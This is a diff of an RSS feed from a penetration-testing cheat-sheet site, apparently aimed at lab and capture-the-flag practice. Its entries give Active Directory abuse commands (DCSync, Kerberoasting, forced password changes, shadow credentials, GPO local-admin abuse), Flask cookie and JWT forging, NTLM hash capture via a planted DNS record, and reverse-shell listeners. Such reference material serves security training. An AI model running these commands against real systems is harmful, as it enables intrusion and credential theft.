+      <description> Cookie Tools flask-unsign # Install pip3 install flask-unsign # Decode flask cookie flask-unsign --decode --cookie &amp;lt;COOKIE&amp;gt; # Brute force secret key flask-unsign --unsign --cookie &amp;lt;COOKIE&amp;gt; -w /usr/share/wordlists/rockyou.txt --no-literal-eval # Forge flask cookie flask-unsign --sign --cookie &amp;lt;COOKIE_DATA&amp;gt; --secret &amp;lt;SECRET&amp;gt; </description>
     </item>
     <item>
       <title>ForceChangePassword</title>
       <link>https://tldrbins.github.io/forcechangepassword/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/forcechangepassword/</guid>
-      <description> Abuse #1a: Change target user password 1. Import PowerView.ps1 . .\PowerView.ps1 2. Change Target User Password $password = ConvertTo-SecureString &amp;lt;PASSWORD&amp;gt; -AsPlainText -Force Set-DomainUserPassword -Identity &amp;lt;TARGET_USER&amp;gt; -AccountPassword $password Abuse #1b: Change target user password 1. Via rpcclient rpcclient -U &amp;#39;&amp;lt;DOMAIN&amp;gt;/&amp;lt;USER&amp;gt;%&amp;lt;PASSWORD&amp;gt;&amp;#39; &amp;lt;TARGET&amp;gt; -c &amp;#39;setuserinfo2 &amp;lt;TARGET_USER&amp;gt; 23 &amp;lt;TARGET_USER_NEW_PASSWORD&amp;gt;&amp;#39; </description>
+      <description> Change target user password (From Linux) BloodyAD rpcclient python3 bloodyAD.py -d &amp;lt;DOMAIN&amp;gt; -u &amp;lt;USERNAME&amp;gt; -p &amp;lt;PASSWORD&amp;gt; --host &amp;lt;DC&amp;gt; set password &amp;lt;TARGET_USER&amp;gt; &amp;lt;NEW_PASSWORD&amp;gt; Ref: bloodyAD&#xA;rpcclient -U &amp;#39;&amp;lt;DOMAIN&amp;gt;/&amp;lt;USER&amp;gt;%&amp;lt;PASSWORD&amp;gt;&amp;#39; &amp;lt;TARGET&amp;gt; -c &amp;#39;setuserinfo2 &amp;lt;TARGET_USER&amp;gt; 23 &amp;lt;TARGET_USER_NEW_PASSWORD&amp;gt;&amp;#39; Change target user password (From Windows) Windows 1. Import PowerView.ps1 . .\PowerView.ps1 2. Change Target User Password $password = ConvertTo-SecureString &amp;lt;PASSWORD&amp;gt; -AsPlainText -Force Set-DomainUserPassword -Identity &amp;lt;TARGET_USER&amp;gt; -AccountPassword $password </description>
     </item>
     <item>
       <title>Forward Shell</title>
@@ -355,35 +348,35 @@
       <link>https://tldrbins.github.io/ftp/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/ftp/</guid>
-      <description>Config Location /etc/vsftpd.conf Basic # Connect ftp 10.10.11.10 +---------------------+ | Anonymous login | +---------------------+ | Username: anonymous | | Password: (empty) | +---------------------+ # List ls # Switch to binary transfer mode bin # Download get &amp;lt;FILE&amp;gt; # Upload put &amp;lt;FILE&amp;gt; # Connect over tunnel passive # Exit quit Recusive download # anonymous login wget -r ftp://anonymous:@10.10.11.10 # with creds wget --user &amp;lt;USER&amp;gt; --password &amp;lt;PASSWORD&amp;gt; -m ftp://10.10.11.10 Note: Always check what&amp;rsquo;s in there first</description>
+      <description>Config Location /etc/vsftpd.conf Basic # Connect ftp 10.10.11.10 +---------------------+ | Anonymous login | +---------------------+ | Username: anonymous | | Password: (empty) | +---------------------+ # Over SSL lftp 10.10.11.10 # Fix cert error echo -n &amp;#39;set ssl:verify-certificate no&amp;#39; &amp;gt;&amp;gt; ~/.lftp/rc # List ls # Switch to binary transfer mode bin # Download get &amp;lt;FILE&amp;gt; # Upload put &amp;lt;FILE&amp;gt; # Connect over tunnel passive # Exit quit Recusive download # anonymous login wget -r ftp://anonymous:@10.</description>
     </item>
     <item>
       <title>GenericAll</title>
       <link>https://tldrbins.github.io/genericall/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/genericall/</guid>
-      <description>Abuse #1: Change target user password (From Windows) 1. Import PowerView.ps1 . .\PowerView.ps1 2. Change target user password $password = ConvertTo-SecureString &amp;lt;PASSWORD&amp;gt; -AsPlainText -Force Set-DomainUserPassword -Identity &amp;lt;TARGET_USER&amp;gt; -AccountPassword $password Abuse #1: Change target user password (From Linux) bloodyAD&#xA;python3 bloodyAD.py -d &amp;lt;DOMAIN&amp;gt; -u &amp;lt;USERNAME&amp;gt; -p &amp;lt;PASSWORD&amp;gt; --host &amp;lt;DC&amp;gt; set password &amp;lt;TARGET_USER&amp;gt; &amp;lt;NEW_PASSWORD&amp;gt; Abuse #2: Get shadow credentials (From Linux) sudo ntpdate -s &amp;lt;DC&amp;gt; &amp;amp;&amp;amp; certipy-ad shadow auto -username &amp;lt;USERNAME&amp;gt;@&amp;lt;DOMAIN&amp;gt; -password &amp;lt;PASSWORD&amp;gt; -k -account &amp;lt;TARGET_USER&amp;gt; -target &amp;lt;DC&amp;gt; Abuse #3 : Add user to group (From Windows) 1.</description>
+      <description>Abuse #1: Change target user password Linux Windows 0. Install latest impacket (included dacledit.py) [optional] git clone https://github.com/fortra/impacket.git cd impacket pip3 install . 1. Add Full Control to current user [optional] dacledit.py -k &amp;#39;&amp;lt;DOMAIN&amp;gt;/&amp;lt;USER&amp;gt;:&amp;lt;PASSWORD&amp;gt;&amp;#39; -dc-ip &amp;lt;DC&amp;gt; -principal &amp;lt;USER&amp;gt; -target-dn &amp;#39;OU=&amp;lt;TARGET_GROUP&amp;gt;,DC=EXAMPLE,DC=COM&amp;#39; -inheritance -action write -rights FullControl 2. Change password BloodyAD&#xA;python3 bloodyAD.py -d &amp;lt;DOMAIN&amp;gt; -u &amp;lt;USERNAME&amp;gt; -p &amp;lt;PASSWORD&amp;gt; --host &amp;lt;DC&amp;gt; set password &amp;lt;TARGET_USER&amp;gt; &amp;lt;NEW_PASSWORD&amp;gt; Ref: bloodyAD&#xA;1. Import PowerView.ps1 . .</description>
     </item>
     <item>
       <title>GenericWrite</title>
       <link>https://tldrbins.github.io/genericwrite/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/genericwrite/</guid>
-      <description>Abuse #1 : Add UF_DONT_REQUIRE_PREAUTH bit to target user 1. Import PowerView.ps1 . .\PowerView.ps1 2. Check target user Get-DomainUser &amp;lt;TARGET_USER&amp;gt; | ConvertFrom-UACValue 3. Add UF_DONT_REQUIRE_PREAUTH bit Set-DomainObject -Identity &amp;lt;TARGET_USER&amp;gt; -XOR @{useraccountcontrol=4194304} -Verbose 4. AS-REP Roasting # In local linux machine impacket-GetNPUsers &amp;lt;DOMAIN&amp;gt;/&amp;lt;USER&amp;gt; -no-pass -dc-ip &amp;lt;DC&amp;gt; Abuse #2 : Kerberoasting by adding spn 1. Import PowerView.ps1 . .\PowerView.ps1 2. Create cred object (runas) [optional] $username = &amp;#34;&amp;lt;DOMAIN&amp;gt;\&amp;lt;USER&amp;gt;&amp;#34; $password = ConvertTo-SecureString &amp;lt;PASSWORD&amp;gt; -AsPlainText -Force $cred = new-object -typename System.</description>
+      <description>Abuse #1 : Add UF_DONT_REQUIRE_PREAUTH bit to target user Windows 1. Import PowerView.ps1 . .\PowerView.ps1 2. Check target user Get-DomainUser &amp;lt;TARGET_USER&amp;gt; | ConvertFrom-UACValue 3. Add UF_DONT_REQUIRE_PREAUTH bit Set-DomainObject -Identity &amp;lt;TARGET_USER&amp;gt; -XOR @{useraccountcontrol=4194304} -Verbose 4. AS-REP Roasting # In local linux machine impacket-GetNPUsers &amp;lt;DOMAIN&amp;gt;/&amp;lt;USER&amp;gt; -no-pass -dc-ip &amp;lt;DC&amp;gt; Abuse #2 : Kerberoasting by adding spn Windows 1. Import PowerView.ps1 . .\PowerView.ps1 2. Create cred object (runas) [optional] $username = &amp;#34;&amp;lt;DOMAIN&amp;gt;\&amp;lt;USER&amp;gt;&amp;#34; $password = ConvertTo-SecureString &amp;lt;PASSWORD&amp;gt; -AsPlainText -Force $cred = new-object -typename System.</description>
     </item>
     <item>
       <title>GetChanges/GetChangesAll</title>
       <link>https://tldrbins.github.io/getchanges_getchangesall/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/getchanges_getchangesall/</guid>
-      <description> Abuse #1: DCSync Attack (From Linux) # With creds impacket-secretsdump -just-dc &amp;lt;USER&amp;gt;:&amp;lt;PASSWORD&amp;gt;@&amp;lt;TARGET&amp;gt; # With hashes impacket-secretsdump -hashes &amp;lt;LM&amp;gt;:&amp;lt;NT&amp;gt; -just-dc &amp;lt;DOMAIN&amp;gt;/&amp;lt;USER&amp;gt;@&amp;lt;TARGET&amp;gt; Abuse #1: DCSync Attack (From Windows) .\mimikatz.exe &amp;#39;lsadump::dcsync /domain:&amp;lt;DOMAIN&amp;gt; /user:administrator&amp;#39; exit </description>
+      <description> Abuse #1: DCSync Attack Linux Windows # With creds impacket-secretsdump -just-dc &amp;lt;USER&amp;gt;:&amp;lt;PASSWORD&amp;gt;@&amp;lt;TARGET&amp;gt; # With hashes impacket-secretsdump -hashes &amp;lt;LM&amp;gt;:&amp;lt;NT&amp;gt; -just-dc &amp;lt;DOMAIN&amp;gt;/&amp;lt;USER&amp;gt;@&amp;lt;TARGET&amp;gt; .\mimikatz.exe &amp;#39;lsadump::dcsync /domain:&amp;lt;DOMAIN&amp;gt; /user:administrator&amp;#39; exit </description>
     </item>
     <item>
       <title>git</title>
       <link>https://tldrbins.github.io/git/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/git/</guid>
-      <description>Basic Commands # Show status git status # Reset the current branch to a previous commit git reset --hard # Show information about files git ls-files --stage # Show current branch git branch # Show commits git log &amp;lt;BRANCH_NAME&amp;gt; --oneline # Show diff, a and b are commit hash # a is the older commit git diff [a] [b] # Show commit git show &amp;lt;COMMIT_HASH&amp;gt; SUDO # Copy target project cp -r /var/www/html/project .</description>
+      <description>Basic Commands # Show status git status # Reset the current branch to a previous commit git reset --hard # Show information about files git ls-files --stage # Show current branch git branch # Show commits git log &amp;lt;BRANCH_NAME&amp;gt; --oneline # Show diff, a and b are commit hash # a is the older commit git diff [a] [b] # Show commit git show &amp;lt;COMMIT_HASH&amp;gt; Git Tools git-dumper git-bundle git-dumper http://10.</description>
     </item>
     <item>
       <title>GPG</title>
@@ -397,14 +390,14 @@
       <link>https://tldrbins.github.io/gpos/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/gpos/</guid>
-      <description> Abuse #1: Add local admin SharpGPOAbuse&#xA;1. List GPOs Name Get-GPO -All | Select-Object DisplayName 2. Add localAdmin .\SharpGPOAbuse.exe --AddLocalADmin --UserAccount &amp;lt;USER&amp;gt; --GPOName &amp;lt;GPO_NAME&amp;gt; 3. Force reload gpupdate /force </description>
+      <description>Abuse #1: Add local admin 1. List GPOs Name Get-GPO -All | Select-Object DisplayName 2. Add localAdmin .\SharpGPOAbuse.exe --AddLocalADmin --UserAccount &amp;lt;USER&amp;gt; --GPOName &amp;lt;GPO_NAME&amp;gt; 3. Force reload gpupdate /force Ref: SharpGPOAbuse</description>
     </item>
     <item>
       <title>Graphql</title>
       <link>https://tldrbins.github.io/graphql/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/graphql/</guid>
-      <description>Visualize Tool graphql-voyager&#xA;+---------------------------------------------------------------+ | 1. Change Schema -&amp;gt; Introspection -&amp;gt; Copy Introspection Query | | 2. Paste query | | 3. Display | +---------------------------------------------------------------+ Basic Commands # Get fields from schema curl -s 10.10.11.10:3000/graphql -H &amp;#34;Content-Type: application/json&amp;#34; -d &amp;#39;{&amp;#34;query&amp;#34;:&amp;#34;{__schema{queryType{name,fields{name,description}}}}&amp;#34;}&amp;#39; | jq . # Get types name curl -s 10.10.11.10:3000/graphql -H &amp;#34;Content-Type: application/json&amp;#34; -d &amp;#39;{&amp;#34;query&amp;#34;:&amp;#34;{__schema{types{name}}}&amp;#34;}&amp;#39; | jq . # Get fields of type (e.g. User) curl -s 10.10.11.10:3000/graphql -H &amp;#34;Content-Type: application/json&amp;#34; -d &amp;#39;{&amp;#34;query&amp;#34;:&amp;#34;{__type(name:\&amp;#34;User\&amp;#34;){name,fields{name}}}&amp;#34;}&amp;#39; | jq .</description>
+      <description>Visualize Tool +---------------------------------------------------------------+ | 1. Change Schema -&amp;gt; Introspection -&amp;gt; Copy Introspection Query | | 2. Paste query | | 3. Display | +---------------------------------------------------------------+ Ref: graphql-voyager&#xA;Basic Commands # Get fields from schema curl -s 10.10.11.10:3000/graphql -H &amp;#34;Content-Type: application/json&amp;#34; -d &amp;#39;{&amp;#34;query&amp;#34;:&amp;#34;{__schema{queryType{name,fields{name,description}}}}&amp;#34;}&amp;#39; | jq . # Get types name curl -s 10.10.11.10:3000/graphql -H &amp;#34;Content-Type: application/json&amp;#34; -d &amp;#39;{&amp;#34;query&amp;#34;:&amp;#34;{__schema{types{name}}}&amp;#34;}&amp;#39; | jq . # Get fields of type (e.g. User) curl -s 10.10.11.10:3000/graphql -H &amp;#34;Content-Type: application/json&amp;#34; -d &amp;#39;{&amp;#34;query&amp;#34;:&amp;#34;{__type(name:\&amp;#34;User\&amp;#34;){name,fields{name}}}&amp;#34;}&amp;#39; | jq .</description>
     </item>
     <item>
       <title>Grep</title>
@@ -412,13 +405,6 @@
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/grep/</guid>
       <description> Basic grep &amp;#39;text&amp;#39; file.txt Grep from files recursively (e.g from current directory) grep -rni &amp;#39;text&amp;#39; . Grep from binary grep -a &amp;#39;text&amp;#39; binary Grep hash from binary with perl regex grep -aPo &amp;#39;[a-fA-F0-9]{32}&amp;#39; binary Grep from binaries recusively (e.g. from /var/log) sudo grep -rHa &amp;#34;password&amp;#34; /var/log Find unique char of a file cat file.txt | od -cvA none -w1 | sort -bu | tr -d &amp;#39;\n&amp;#39; | tr -d &amp;#39; &amp;#39; </description>
-    </item>
-    <item>
-      <title>Host a SMB Server</title>
-      <link>https://tldrbins.github.io/smb_server/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      <guid>https://tldrbins.github.io/smb_server/</guid>
-      <description> Start a SMB Server for File Transfer Common Use impacket-smbserver share . -smb2support With Creds impacket-smbserver share . -smb2support -username &amp;lt;USER&amp;gt; -password &amp;lt;PASSWORD&amp;gt; Note: Sometimes smb server with creds may not work&#xA;For older Windows Machines impacket-smbserver share . </description>
     </item>
     <item>
       <title>Hydra</title>
@@ -446,14 +432,14 @@
       <link>https://tldrbins.github.io/irc/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/irc/</guid>
-      <description> Tool sudo apt install hexchat </description>
+      <description> IRC Tools hexchat sudo apt install hexchat </description>
     </item>
     <item>
       <title>Java</title>
       <link>https://tldrbins.github.io/java/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/java/</guid>
-      <description> Java Decompile JAR Download jd-gui&#xA;jd-gui Compile # Compile javac src/program.java # Pack into jar jar -cvf program.jar -C src/ . </description>
+      <description> Java Decompile JAR jd-gui Ref: Download jd-gui&#xA;Compile # Compile javac src/program.java # Pack into jar jar -cvf program.jar -C src/ . </description>
     </item>
     <item>
       <title>Java Environment</title>
@@ -474,70 +460,70 @@
       <link>https://tldrbins.github.io/jwt/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/jwt/</guid>
-      <description>Abuse #1: Algorithm confusion 0. Sample jwks.json { &amp;#34;keys&amp;#34;: [ { &amp;#34;kty&amp;#34;: &amp;#34;RSA&amp;#34;, &amp;#34;use&amp;#34;: &amp;#34;sig&amp;#34;, &amp;#34;alg&amp;#34;: &amp;#34;RS256&amp;#34;, &amp;#34;n&amp;#34;: &amp;#34;&amp;lt;BASE64_n&amp;gt;&amp;#34;, &amp;#34;e&amp;#34;: &amp;#34;AQAB&amp;#34; } ] } 1. Create a public key python3 from base64 import urlsafe_b64decode from Crypto.PublicKey import RSA e = int.from_bytes(urlsafe_b64decode(b&amp;#39;AQAB&amp;#39;)) n = int.from_bytes(urlsafe_b64decode(b&amp;#39;&amp;lt;BASE64_n&amp;gt;&amp;#39;)) key = RSA.construct((n, e)) # Save it to public.pem print(key.exportKey().decode()) 2. Forge a jwt jwt_tool&#xA;# For example, modify role to admin python3 jwt_tool.py -S hs256 -k public.</description>
+      <description>Abuse #1: Algorithm confusion 0. Sample jwks.json { &amp;#34;keys&amp;#34;: [ { &amp;#34;kty&amp;#34;: &amp;#34;RSA&amp;#34;, &amp;#34;use&amp;#34;: &amp;#34;sig&amp;#34;, &amp;#34;alg&amp;#34;: &amp;#34;RS256&amp;#34;, &amp;#34;n&amp;#34;: &amp;#34;&amp;lt;BASE64_n&amp;gt;&amp;#34;, &amp;#34;e&amp;#34;: &amp;#34;AQAB&amp;#34; } ] } 1. Create a public key python3 from base64 import urlsafe_b64decode from Crypto.PublicKey import RSA e = int.from_bytes(urlsafe_b64decode(b&amp;#39;AQAB&amp;#39;)) n = int.from_bytes(urlsafe_b64decode(b&amp;#39;&amp;lt;BASE64_n&amp;gt;&amp;#39;)) key = RSA.construct((n, e)) # Save it to public.pem print(key.exportKey().decode()) 2. Forge a jwt # For example, modify role to admin python3 jwt_tool.py -S hs256 -k public.</description>
     </item>
     <item>
       <title>Keepass</title>
       <link>https://tldrbins.github.io/keepass/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/keepass/</guid>
-      <description> Master password cracking keepass2john key.kdbx &amp;gt; hash # With a key file keepass2john -k key.png key.kdbx &amp;gt; hash kpcli Download kpcli&#xA;# Open kdbx kpcli --kdb key.kdbx # Open kdbx with a key file kpcli --key key.png --kdb key.kdbx # List all passwords find . # Show password (e.g. #0) show -f 0 </description>
+      <description>Master password cracking keepass2john key.kdbx &amp;gt; hash # With a key file keepass2john -k key.png key.kdbx &amp;gt; hash kpcli # Open kdbx kpcli --kdb key.kdbx # Open kdbx with a key file kpcli --key key.png --kdb key.kdbx # List all passwords find . # Show password (e.g. #0) show -f 0 # Export attachment (e.g. #0) attach 0 Ref: Download kpcli</description>
     </item>
     <item>
       <title>Kerberoasting</title>
       <link>https://tldrbins.github.io/roasting/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/roasting/</guid>
-      <description>AS_REP Roasting # Multiple valid usernames impacket-GetNPUsers &amp;lt;DOMAIN&amp;gt;/ -usersfile usernames.txt -no-pass -dc-ip &amp;lt;DC&amp;gt; # Multiple valid usernames (nxc) nxc ldap 10.10.11.10 -u usernames.txt -p &amp;#39;&amp;#39; --asreproast as_rep_hashes.txt # Single user without creds impacket-GetNPUsers -no-pass -dc-ip 10.10.11.10 &amp;lt;DOMAIN&amp;gt;/&amp;lt;USER&amp;gt; Kerberoasting From Linux # Fix time skew sudo ntpdate -s &amp;lt;DC&amp;gt; &amp;amp;&amp;amp; impacket-GetUserSPNs -request &amp;#39;&amp;lt;DOMAIN&amp;gt;/&amp;lt;USER&amp;gt;:&amp;lt;PASSWORD&amp;gt;&amp;#39; -dc-ip &amp;lt;DC_IP&amp;gt; Note: Times skew have to be within 5 minutes in kerberos&#xA;# Kerberoasting without cred sudo ntpdate -s &amp;lt;DC&amp;gt; &amp;amp;&amp;amp; impacket-GetUserSPNs -no-preauth &amp;lt;USER_WITH_DONT_REQUIRE_PREAUTH&amp;gt; -usersfile usernames.</description>
+      <description>AS_REP Roasting Impacket nxc # Multiple valid usernames impacket-GetNPUsers &amp;lt;DOMAIN&amp;gt;/ -usersfile usernames.txt -no-pass -dc-ip &amp;lt;DC&amp;gt; # Single user without creds impacket-GetNPUsers -no-pass -dc-ip 10.10.11.10 &amp;lt;DOMAIN&amp;gt;/&amp;lt;USER&amp;gt; # Multiple valid usernames (nxc) nxc ldap 10.10.11.10 -u usernames.txt -p &amp;#39;&amp;#39; --asreproast as_rep_hashes.txt Kerberoasting (From Linux) Impacket nxc # Fix time skew sudo ntpdate -s &amp;lt;DC&amp;gt; &amp;amp;&amp;amp; impacket-GetUserSPNs -request &amp;#39;&amp;lt;DOMAIN&amp;gt;/&amp;lt;USER&amp;gt;:&amp;lt;PASSWORD&amp;gt;&amp;#39; -dc-ip &amp;lt;DC_IP&amp;gt; Note: Times skew have to be within 5 minutes in kerberos</description>
     </item>
     <item>
       <title>Kerberos</title>
       <link>https://tldrbins.github.io/kerberos/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/kerberos/</guid>
-      <description>Kerbrute kerbrute&#xA;kerbrute userenum --domain &amp;lt;DOMAIN&amp;gt; --dc &amp;lt;DC&amp;gt; usernames.txt Usernames generator username-anarchy&#xA;./username-anarchy -i users.txt | tee usernames.txt Generate Kerberos Ticket (From Linux) Method #1: Using impacket sudo ntpdate -s &amp;lt;DC&amp;gt; &amp;amp;&amp;amp; impacket-getTGT -hashes :&amp;lt;HASH&amp;gt; &amp;lt;DOMAIN&amp;gt;/administrator export KRB5CCNAME=administrator.ccache # Check ticket klist Method #2 : Using kinit # Step 0: Installation sudo apt install krb5-user cifs-utils # Step 1: Add domain controller to &amp;#39;/etc/hosts&amp;#39; (Try different order if not work) 10.</description>
+      <description>Users enum kerbrute kerbrute userenum --domain &amp;lt;DOMAIN&amp;gt; --dc &amp;lt;DC&amp;gt; usernames.txt Ref: kerbrute&#xA;Usernames generator username-anarchy ./username-anarchy -i users.txt | tee usernames.txt Ref: username-anarchy&#xA;Generate Kerberos ticket (From Linux) Impacket Kinit sudo ntpdate -s &amp;lt;DC&amp;gt; &amp;amp;&amp;amp; impacket-getTGT -hashes :&amp;lt;HASH&amp;gt; &amp;lt;DOMAIN&amp;gt;/administrator export KRB5CCNAME=administrator.ccache # Check ticket klist # Step 0: Installation sudo apt install krb5-user cifs-utils # Step 1: Add domain controller to &amp;#39;/etc/hosts&amp;#39; (Try different order if not work) 10.10.11.10 &amp;lt;DC&amp;gt; &amp;lt;DOMAIN&amp;gt; # Step 2: Add domain controller as a DNS server to &amp;#39;/etc/resolv.</description>
     </item>
     <item>
       <title>Krbrelayx</title>
       <link>https://tldrbins.github.io/krbrelayx/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/krbrelayx/</guid>
-      <description> Tools krbrelayx&#xA;Abuse #1: Add Active Directory Integrated DNS records via LDAP python3 dnstool.py -u &amp;lt;DOMAIN&amp;gt;\\&amp;lt;USER&amp;gt; -p &amp;lt;PASSWORD&amp;gt; --action add --record test --data 10.10.14.10 --type A 10.10.11.10 # Capture NTLM hash sudo responder -I tun0 </description>
+      <description>Abuse #1: Add Active Directory Integrated DNS records via LDAP Linux # Capture NTLM hash sudo responder -I tun0 python3 dnstool.py -u &amp;lt;DOMAIN&amp;gt;\\&amp;lt;USER&amp;gt; -p &amp;lt;PASSWORD&amp;gt; --action add --record test --data 10.10.14.10 --type A 10.10.11.10 Ref: krbrelayx tools</description>
     </item>
     <item>
       <title>Kubelet</title>
       <link>https://tldrbins.github.io/kubelet/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/kubelet/</guid>
-      <description> Tools kubeletctl&#xA;Basic Commands # List all the pods on the node kubeletctl pods -s 10.10.11.10 # List running pods kubeletctl runningpods -s 10.10.11.10 # Exec command kubeletctl exec &amp;#34;/bin/bash&amp;#34; -p &amp;lt;POD_NAME&amp;gt; -c &amp;lt;CONTAINER_NAME&amp;gt; -s 10.10.11.10 </description>
+      <description>Basic Commands # List all the pods on the node kubeletctl pods -s 10.10.11.10 # List running pods kubeletctl runningpods -s 10.10.11.10 # Exec command kubeletctl exec &amp;#34;/bin/bash&amp;#34; -p &amp;lt;POD_NAME&amp;gt; -c &amp;lt;CONTAINER_NAME&amp;gt; -s 10.10.11.10 Ref: kubeletctl</description>
     </item>
     <item>
       <title>Kubernetes</title>
       <link>https://tldrbins.github.io/kubernetes/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/kubernetes/</guid>
-      <description>Token Location /run/secrets/kubernetes.io/serviceaccount/token Certificate Location /run/secrets/kubernetes.io/serviceaccount/ca.crt Tools kubectl&#xA;Basic Commands # List all namespaces kubectl --token &amp;lt;TOKEN&amp;gt; --certificate-authority ca.crt --server https://10.10.11.10:8443 get namespaces # Get user permissions in current namespace kubectl --token &amp;lt;TOKEN&amp;gt; --certificate-authority ca.crt --server https://10.10.11.10:8443 auth can-i --list # Get user permissions in specific namespace kubectl --token &amp;lt;TOKEN&amp;gt; --certificate-authority ca.crt --server https://10.10.11.10:8443 auth can-i --list -n &amp;lt;NAMESPACE&amp;gt; # List all pods kubectl --token &amp;lt;TOKEN&amp;gt; --certificate-authority ca.crt --server https://10.</description>
+      <description>Token Location /run/secrets/kubernetes.io/serviceaccount/token Certificate Location /run/secrets/kubernetes.io/serviceaccount/ca.crt Basic Commands # List all namespaces kubectl --token &amp;lt;TOKEN&amp;gt; --certificate-authority ca.crt --server https://10.10.11.10:8443 get namespaces # Get user permissions in current namespace kubectl --token &amp;lt;TOKEN&amp;gt; --certificate-authority ca.crt --server https://10.10.11.10:8443 auth can-i --list # Get user permissions in specific namespace kubectl --token &amp;lt;TOKEN&amp;gt; --certificate-authority ca.crt --server https://10.10.11.10:8443 auth can-i --list -n &amp;lt;NAMESPACE&amp;gt; # List all pods kubectl --token &amp;lt;TOKEN&amp;gt; --certificate-authority ca.crt --server https://10.10.11.10:8443 get pods --all-namespaces # List pods in specific namespace kubectl --token &amp;lt;TOKEN&amp;gt; --certificate-authority ca.</description>
     </item>
     <item>
       <title>LDAP</title>
       <link>https://tldrbins.github.io/ldap/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/ldap/</guid>
-      <description>Enum # Using nmap script sudo nmap -p 389 --script ldap-search &amp;lt;TARGET&amp;gt; # Using ldapdomaindump (With Creds) ldapdomaindump -u &amp;#39;&amp;lt;DOMAIN&amp;gt;\&amp;lt;USER&amp;gt;&amp;#39; -p &amp;lt;PASSWORD&amp;gt; &amp;lt;TARGET&amp;gt; -o ./ldap # Get domain base ldapsearch -x -H ldap://10.10.11.10 -s base namingcontexts # Get all from domain ldapsearch -x -H ldap://10.10.11.10 -b &amp;#39;DC=&amp;lt;EXAMPLE&amp;gt;,DC=&amp;lt;COM&amp;gt;&amp;#39; # Just get a class (e.g. person) ldapsearch -x -H ldap://10.10.11.10 -b &amp;#39;DC=&amp;lt;EXAMPLE&amp;gt;,DC=&amp;lt;COM&amp;gt;&amp;#39; &amp;#39;(objectClass=person)&amp;#39; # With creds (e.g. john.appleseed) ldapsearch -x -H ldap://10.</description>
+      <description>Enum nmap ldapdomaindump ldapsearch # Using nmap script sudo nmap -p 389 --script ldap-search &amp;lt;TARGET&amp;gt; # Using ldapdomaindump (With Creds) ldapdomaindump -u &amp;#39;&amp;lt;DOMAIN&amp;gt;\&amp;lt;USER&amp;gt;&amp;#39; -p &amp;lt;PASSWORD&amp;gt; &amp;lt;TARGET&amp;gt; -o ./ldap # Get domain base ldapsearch -x -H ldap://10.10.11.10 -s base namingcontexts # Get all from domain ldapsearch -x -H ldap://10.10.11.10 -b &amp;#39;DC=&amp;lt;EXAMPLE&amp;gt;,DC=&amp;lt;COM&amp;gt;&amp;#39; # Just get a class (e.g. person) ldapsearch -x -H ldap://10.10.11.10 -b &amp;#39;DC=&amp;lt;EXAMPLE&amp;gt;,DC=&amp;lt;COM&amp;gt;&amp;#39; &amp;#39;(objectClass=person)&amp;#39; # With creds (e.g. john.appleseed) ldapsearch -x -H ldap://10.</description>
     </item>
     <item>
       <title>Linux hard disk encryption</title>
       <link>https://tldrbins.github.io/linux_hard_disk_encryption_luks/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/linux_hard_disk_encryption_luks/</guid>
-      <description> Brute force LUKS password bruteforce-luks -t 10 -f wordlist.txt -w state.txt -v 30 backup.img Note: This is slow, create a small wordlist&#xA;Open cryptsetup open --type luks backup.img backup Check ls -l /dev/mapper/ Mount sudo mkdir /mnt/backup sudo mount /dev/mapper/backup /mnt/backup/ </description>
+      <description> Brute force LUKS password bruteforce-luks -t 10 -f wordlist.txt -w state.txt -v 30 backup.img Note: This is slow, create a small wordlist&#xA;Basic # Open cryptsetup open --type luks backup.img backup # Check ls -l /dev/mapper/ # Create mount folder sudo mkdir /mnt/backup # Mount sudo mount /dev/mapper/backup /mnt/backup/ </description>
     </item>
     <item>
       <title>Listeners</title>
       <link>https://tldrbins.github.io/listeners/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/listeners/</guid>
-      <description> nc rlwrap nc -lvnp 1337 ncat # Default listening on both ipv4 and ipv6 rlwrap ncat -lvnp 1337 pwncat Download pwncat&#xA;pwncat-cs -lp 1337 # After getting a connection (local) pwncat$ back </description>
+      <description>Listener Tools nc ncat pwncat rlwrap nc -lvnp 1337 # Default listening on both ipv4 and ipv6 rlwrap ncat -lvnp 1337 pwncat-cs -lp 1337 # After getting a connection (local) pwncat$ back Ref: pwncat</description>
     </item>
     <item>
       <title>lxd</title>
